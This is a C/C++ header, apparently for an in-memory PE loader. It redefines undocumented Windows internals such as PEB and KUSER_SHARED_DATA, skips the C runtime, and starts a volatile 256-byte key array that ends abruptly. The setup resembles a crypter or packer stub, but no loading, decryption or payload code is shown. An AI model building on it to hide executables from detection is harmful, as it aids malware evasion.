#ifndef PELDR_H
#define PELDR_H

#pragma once
#include <Windows.h>
// #include <winternl.h>

// FUCK CRT 
void * __cdecl memset(void *pTarget, int value, size_t cbTarget) {
	unsigned char *p = static_cast<unsigned char *>(pTarget);
	while (cbTarget-- > 0) {
		*p++ = static_cast<unsigned char>(value);
	}
	return pTarget;
}

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)  

typedef __success(return >= 0) LONG NTSTATUS;

typedef enum _NT_PRODUCT_TYPE
{
	NtProductWinNt = 1,
	NtProductLanManNt = 2,
	NtProductServer = 3
} NT_PRODUCT_TYPE;

typedef enum _ALTERNATIVE_ARCHITECTURE_TYPE
{
	StandardDesign = 0,
	NEC98x86 = 1,
	EndAlternatives = 2
} ALTERNATIVE_ARCHITECTURE_TYPE;

typedef struct _KSYSTEM_TIME
{
	ULONG LowPart;
	LONG High1Time;
	LONG High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;

typedef struct _KUSER_SHARED_DATA
{
	ULONG TickCountLowDeprecated;
	ULONG TickCountMultiplier;
	KSYSTEM_TIME InterruptTime;
	KSYSTEM_TIME SystemTime;
	KSYSTEM_TIME TimeZoneBias;
	WORD ImageNumberLow;
	WORD ImageNumberHigh;
	WCHAR NtSystemRoot[260];
	ULONG MaxStackTraceDepth;
	ULONG CryptoExponent;
	ULONG TimeZoneId;
	ULONG LargePageMinimum;
	ULONG Reserved2[7];
	NT_PRODUCT_TYPE NtProductType;
	UCHAR ProductTypeIsValid;
	ULONG NtMajorVersion;
	ULONG NtMinorVersion;
	UCHAR ProcessorFeatures[64];
	ULONG Reserved1;
	ULONG Reserved3;
	ULONG TimeSlip;
	ALTERNATIVE_ARCHITECTURE_TYPE AlternativeArchitecture;
	LARGE_INTEGER SystemExpirationDate;
	ULONG SuiteMask;
	UCHAR KdDebuggerEnabled;
	UCHAR NXSupportPolicy;
	ULONG ActiveConsoleId;
	ULONG DismountCount;
	ULONG ComPlusPackage;
	ULONG LastSystemRITEventTickCount;
	ULONG NumberOfPhysicalPages;
	UCHAR SafeBootMode;
	ULONG SharedDataFlags;
	ULONG DbgErrorPortPresent : 1;
	ULONG DbgElevationEnabled : 1;
	ULONG DbgVirtEnabled : 1;
	ULONG DbgInstallerDetectEnabled : 1;
	ULONG SystemDllRelocated : 1;
	ULONG SpareBits : 27;
	UINT64 TestRetInstruction;
	ULONG SystemCall;
	ULONG SystemCallReturn;
	UINT64 SystemCallPad[3];
	union
	{
		KSYSTEM_TIME TickCount;
		UINT64 TickCountQuad;
	};
	ULONG Cookie;
	INT64 ConsoleSessionForegroundProcessId;
	ULONG Wow64SharedInformation[16];
	WORD UserModeGlobalLogger[8];
	ULONG HeapTracingPid[2];
	ULONG CritSecTracingPid[2];
	ULONG ImageFileExecutionOptions;
	union
	{
		UINT64 AffinityPad;
		ULONG ActiveProcessorAffinity;
	};
	UINT64 InterruptTimeBias;
} KUSER_SHARED_DATA, *PKUSER_SHARED_DATA;

typedef struct _LSA_UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	USHORT                  Flags;
	USHORT                  Length;
	ULONG                   TimeStamp;
	UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG                   MaximumLength;
	ULONG                   Length;
	ULONG                   Flags;
	ULONG                   DebugFlags;
	PVOID                   ConsoleHandle;
	ULONG                   ConsoleFlags;
	HANDLE                  StdInputHandle;
	HANDLE                  StdOutputHandle;
	HANDLE                  StdErrorHandle;
	UNICODE_STRING          CurrentDirectoryPath;
	HANDLE                  CurrentDirectoryHandle;
	UNICODE_STRING          DllPath;
	UNICODE_STRING          ImagePathName;
	UNICODE_STRING          CommandLine;
	PVOID                   Environment;
	ULONG                   StartingPositionLeft;
	ULONG                   StartingPositionTop;
	ULONG                   Width;
	ULONG                   Height;
	ULONG                   CharWidth;
	ULONG                   CharHeight;
	ULONG                   ConsoleTextAttributes;
	ULONG                   WindowFlags;
	ULONG                   ShowWindowFlags;
	UNICODE_STRING          WindowTitle;
	UNICODE_STRING          DesktopName;
	UNICODE_STRING          ShellInfo;
	UNICODE_STRING          RuntimeData;
	RTL_DRIVE_LETTER_CURDIR DLCurrentDirectory[0x20];
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA
{
	ULONG                   Length;
	BOOLEAN                 Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;

} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct tagRTL_BITMAP
{
	ULONG  SizeOfBitMap; /* Number of bits in the bitmap */
	PULONG Buffer; /* Bitmap data, assumed sized to a DWORD boundary */
} RTL_BITMAP, *PRTL_BITMAP;

typedef struct _PEB
{
	BOOLEAN                      InheritedAddressSpace;             /*  00 */
	BOOLEAN                      ReadImageFileExecOptions;          /*  01 */
	BOOLEAN                      BeingDebugged;                     /*  02 */
	BOOLEAN                      SpareBool;                         /*  03 */
	HANDLE                       Mutant;                            /*  04 */
	HMODULE                      ImageBaseAddress;                  /*  08 */
	PPEB_LDR_DATA                LdrData;                           /*  0c */
	RTL_USER_PROCESS_PARAMETERS *ProcessParameters;                 /*  10 */
	PVOID                        SubSystemData;                     /*  14 */
	HANDLE                       ProcessHeap;                       /*  18 */
	PRTL_CRITICAL_SECTION        FastPebLock;                       /*  1c */
	PVOID /*PPEBLOCKROUTINE*/    FastPebLockRoutine;                /*  20 */
	PVOID /*PPEBLOCKROUTINE*/    FastPebUnlockRoutine;              /*  24 */
	ULONG                        EnvironmentUpdateCount;            /*  28 */
	PVOID                        KernelCallbackTable;               /*  2c */
	PVOID                        EventLogSection;                   /*  30 */
	PVOID                        EventLog;                          /*  34 */
	PVOID /*PPEB_FREE_BLOCK*/    FreeList;                          /*  38 */
	ULONG                        TlsExpansionCounter;               /*  3c */
	PRTL_BITMAP                  TlsBitmap;                         /*  40 */
	ULONG                        TlsBitmapBits[2];                  /*  44 */
	PVOID                        ReadOnlySharedMemoryBase;          /*  4c */
	PVOID                        ReadOnlySharedMemoryHeap;          /*  50 */
	PVOID                       *ReadOnlyStaticServerData;          /*  54 */
	PVOID                        AnsiCodePageData;                  /*  58 */
	PVOID                        OemCodePageData;                   /*  5c */
	PVOID                        UnicodeCaseTableData;              /*  60 */
	ULONG                        NumberOfProcessors;                /*  64 */
	ULONG                        NtGlobalFlag;                      /*  68 */
	BYTE                         Spare2[4];                         /*  6c */
	LARGE_INTEGER                CriticalSectionTimeout;            /*  70 */
	ULONG                        HeapSegmentReserve;                /*  78 */
	ULONG                        HeapSegmentCommit;                 /*  7c */
	ULONG                        HeapDeCommitTotalFreeThreshold;    /*  80 */
	ULONG                        HeapDeCommitFreeBlockThreshold;    /*  84 */
	ULONG                        NumberOfHeaps;                     /*  88 */
	ULONG                        MaximumNumberOfHeaps;              /*  8c */
	PVOID                       *ProcessHeaps;                      /*  90 */
	PVOID                        GdiSharedHandleTable;              /*  94 */
	PVOID                        ProcessStarterHelper;              /*  98 */
	PVOID                        GdiDCAttributeList;                /*  9c */
	PVOID                        LoaderLock;                        /*  a0 */
	ULONG                        OSMajorVersion;                    /*  a4 */
	ULONG                        OSMinorVersion;                    /*  a8 */
	ULONG                        OSBuildNumber;                     /*  ac */
	ULONG                        OSPlatformId;                      /*  b0 */
	ULONG                        ImageSubSystem;                    /*  b4 */
	ULONG                        ImageSubSystemMajorVersion;        /*  b8 */
	ULONG                        ImageSubSystemMinorVersion;        /*  bc */
	ULONG                        ImageProcessAffinityMask;          /*  c0 */
	ULONG                        GdiHandleBuffer[34];               /*  c4 */
	ULONG                        PostProcessInitRoutine;            /* 14c */
	PRTL_BITMAP                  TlsExpansionBitmap;                /* 150 */
	ULONG                        TlsExpansionBitmapBits[32];        /* 154 */
	ULONG                        SessionId;                         /* 1d4 */
} PEB, *PPEB;

#define DEBUG_BREAK __asm { int 3 }

#define KEY_SIZE	256

// ****************************************
// ***** DYNAMIC DATA *********************
// ****************************************

#pragma data_seg(".data")
volatile char lpKey[KEY_SIZE] = {
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
